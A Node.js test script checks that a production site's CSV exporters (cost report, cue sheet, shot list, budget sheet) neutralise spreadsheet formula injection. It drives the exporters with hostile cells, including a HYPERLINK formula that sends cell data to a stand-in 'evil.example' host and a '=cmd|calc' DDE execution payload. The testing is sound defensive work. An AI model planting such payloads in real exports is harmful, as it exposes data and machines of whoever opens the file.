#!/usr/bin/env node
/* Every CSV this site exports is opened in Excel or Google Sheets, and both
 * treat a cell beginning = + - @ as a formula rather than as text. A review
 * found four exporters that escaped quotes carefully and did nothing about
 * that, so a scene description, a cue title or a budget line typed on the
 * site would execute on the machine of whoever opened the file.
 *
 * Two halves here. The first drives the real exporters with hostile cells.
 * The second is a sweep: any file that quote-escapes for CSV must also carry
 * the formula guard, so the next exporter someone writes cannot quietly
 * reintroduce this by copying the old pattern.
 *
 * Run: node scripts/test_csv_injection.mjs
 */
import { readFileSync, readdirSync, statSync } from 'fs';
import { dirname, join, relative } from 'path';
import { fileURLToPath } from 'url';

const ROOT = dirname(dirname(fileURLToPath(import.meta.url)));
let pass = 0, fail = 0;
const t = (n, c, d) => { if (c) pass++; else { fail++; console.log('  x ' + n + (d ? '\n      ' + d : '')); } };

/* The payloads a spreadsheet actually acts on. The last two matter because a
   leading tab or carriage return is whitespace to a human reading the file
   and a formula to the program parsing it. */
const ATTACKS = [
  '=1+1',
  '=HYPERLINK("http://evil.example/?x="&A1,"Click")',
  '+1+1',
  '-1+1',
  '@SUM(A1:A9)',
  '\t=1+1',
  '\r=1+1',
];
/* A cell is safe when it does not begin a formula. Quoting alone does not
   help: Excel parses "=1+1" as a formula once it has stripped the quotes. */
const unquoted = (cell) => (cell.charAt(0) === '"' ? cell.slice(1, -1).replace(/""/g, '"') : cell);
const dangerous = (cell) => /^[=+\-@\t\r]/.test(unquoted(cell));

function cellsOf(csv) {
  /* Split on commas outside quotes — enough for these fixtures. */
  const out = [];
  for (const line of csv.split('\n')) {
    let cur = '', q = false;
    for (const ch of line) {
      if (ch === '"') { q = !q; cur += ch; }
      else if (ch === ',' && !q) { out.push(cur); cur = ''; }
      else cur += ch;
    }
    out.push(cur);
  }
  return out;
}

function check(label, csv) {
  const bad = cellsOf(csv).filter(dangerous);
  t(label + ' neutralises every formula cell', bad.length === 0, bad.slice(0, 3).join(' | '));
  /* The guard must not eat the text: an apostrophe is added, nothing is lost. */
  t(label + ' keeps the original text', csv.includes('1+1'), csv.slice(0, 200));
}

for (const f of ['js/lib-money-math.js', 'js/lib-money-accounts.js', 'js/lib-money-sheet.js',
                 'js/lib-scenes.js', 'js/lib-shootdays.js', 'finance/lib-money.js', 'production/lib-prod.js', 'boards/lib-shots.js',
                 'music/lib-music.js',
                 'tools/tools-core.js', 'producer/budget-sheet.js']) {
  (0, eval)(readFileSync(join(ROOT, f), 'utf8'));
}
const { CMoney, CShots, CMusic } = globalThis;

/* ── the money room's cost report ─────────────────────────────────── */
{
  const rows = ATTACKS.map((a, i) => ({
    acct: a, name: a, budget: i, actual: 0, committed: 0, etc: 0, efc: 0, variance: 0,
  }));
  check('CMoney.csv', CMoney.csv({ rows, totals: { budget: 0, actual: 0, committed: 0, etc: 0, efc: 0, variance: 0 } }));
}

/* ── the music cue sheet ──────────────────────────────────────────────────
   The cue sheet moved out of production/lib-prod.js (one composer, one
   publisher, no ISWC) into music/lib-music.js, which emits the PRO format one
   line per writer/publisher share. The injection check follows the writer. */
{
  const cues = ATTACKS.map((a) => CMusic.makeCue({
    title: a, artist: a, use: 'featured', status: 'licensed',
    tcIn: a, tcOut: a, durSec: 1, iswc: a, isrc: a, recordLabel: a,
    writers: [{ name: a, role: 'C', pro: a, ipi: a, share: 100 }],
    publishers: [{ name: a, pro: a, ipi: a, share: 100 }],
  }));
  check('CMusic.cueSheetCsv', CMusic.cueSheetCsv(cues, { production: ATTACKS[0] }));
}

/* ── the shot list ────────────────────────────────────────────────── */
{
  const project = { scenes: [{ slug: ATTACKS[0], shots: ATTACKS.map((a) => ({
    size: a, angle: a, move: a, lensMm: 35, dur: 2, desc: a })) }] };
  check('CShots.toCsv', CShots.toCsv(project));
}

/* ── the sweep: no exporter may quote-escape without also guarding ── */
{
  const SKIP = new Set(['node_modules', '.git', 'scripts', 'private', 'local-backend', 'docs']);
  const files = [];
  (function walk(dir) {
    for (const e of readdirSync(dir)) {
      if (SKIP.has(e) || e.charAt(0) === '.') continue;
      const p = join(dir, e);
      if (statSync(p).isDirectory()) walk(p);
      else if (/\.(js|html)$/.test(e)) files.push(p);
    }
  })(ROOT);

  /* The tell-tale of a CSV writer: doubling a quote to escape it.

     This matched ONE spelling — replace(/"/g, '""') with single quotes around
     the replacement. A writer spelled replace(/"/g, "\"\"") or
     .split('"').join('""') was invisible to the sweep, so a NEW sixth exporter
     could ship with no formula guard and never be looked at. The `>= 5` floor
     below stayed satisfied by the five known writers either way, which is what
     made the gap quiet. */
  const ESCAPES = /replace\(\/"\/g\s*,\s*(?:'""'|"\\"\\""|`""`)\)|split\(\s*(?:'"'|"\\""|`"`)\s*\)\s*\.join\(\s*(?:'""'|"\\"\\""|`""`)\s*\)/;
  const GUARD = /\^\[=\+\\?-@\\t\\r\]/;
  const unguarded = [];
  for (const p of files) {
    const src = readFileSync(p, 'utf8');
    if (!ESCAPES.test(src)) continue;
    if (!GUARD.test(src)) unguarded.push(relative(ROOT, p).split('\\').join('/'));
  }
  t('every file that writes CSV also neutralises formulas',
    unguarded.length === 0, unguarded.join(', '));

  /* And the sweep must be looking at something — a regex that matches
     nothing would pass the test above without checking a single file. */
  const writers = files.filter((p) => ESCAPES.test(readFileSync(p, 'utf8')));
  t('the sweep found the CSV writers to check', writers.length >= 5, writers.length + ' found');
}

/* ── the sweep grades TEXT; these two grade BEHAVIOUR ─────────────────
   The sweep above asserts the guard STRING is present in a file. It cannot
   tell whether the guard RUNS. A reviewer proved the gap by rewriting
   producer/budget-sheet.js:213 to `if (false && /^[=+\-@\t\r]/.test(s))` —
   the source text still matched, and this suite plus all six others touching
   that file stayed green.

   Two exporters were covered by text alone. Both are exported, so both can be
   driven for real, which is the only kind of coverage that survives someone
   editing the condition rather than the pattern. */
{
  globalThis.window = globalThis.window || globalThis;
  (0, eval)(readFileSync(join(ROOT, 'js/ui-table.js'), 'utf8'));
  const CTable = globalThis.CTable;
  t('CTable.Register is loaded', !!(CTable && CTable.Register));

  const reg = new CTable.Register({
    key: 'SB_TestOnly_v1',
    fields: [{ id: 'name', label: 'Name' }, { id: 'note', label: 'Note' }],
  });
  reg.rows = ATTACKS.map((a, i) => ({ name: a, note: i === 0 ? '=cmd|calc' : 'ok' }));
  const csv = reg.toCsv();
  const bad = cellsOf(csv).filter(dangerous);
  t('ui-table Register.toCsv neutralises every formula payload',
    bad.length === 0, bad.slice(0, 3).join(' | '));
  /* Counter-assertion: a guard that blanked everything would also pass. */
  t('ui-table Register.toCsv keeps the payload text readable',
    csv.includes('1+1') && csv.includes('HYPERLINK'));
}

{
  (0, eval)(readFileSync(join(ROOT, 'producer/budget-sheet.js'), 'utf8'));
  const BS = globalThis.SBBudgetSheet;
  t('SBBudgetSheet.sheetToCsv is reachable', !!(BS && BS.sheetToCsv));
  if (BS && BS.sheetToCsv) {
    /* Money in CENTS, per the repo's fixture rule. */
    const sheet = {
      name: 'Attack', fringesPct: 0, bondPct: 0, insurancePct: 0, contingencyPct: 0,
      categories: [{
        acct: '1000', name: ATTACKS[0],
        items: ATTACKS.map((a) => ({ desc: a, amt: 1, units: 1, rate: 100, notes: a, actual: 0 })),
      }],
    };
    let out = '';
    try { out = BS.sheetToCsv(sheet); } catch (e) { out = 'THREW: ' + e.message; }
    t('budget-sheet sheetToCsv produced a sheet', out.length > 0 && !out.startsWith('THREW'), out.slice(0, 120));
    const bad2 = cellsOf(out).filter(dangerous);
    t('budget-sheet sheetToCsv neutralises every formula payload',
      bad2.length === 0, bad2.slice(0, 3).join(' | '));
    t('budget-sheet sheetToCsv keeps the payload text readable', out.includes('1+1'));
  }
}

console.log(`test_csv_injection: ${pass} passed, ${fail} failed`);
process.exit(fail ? 1 : 0);
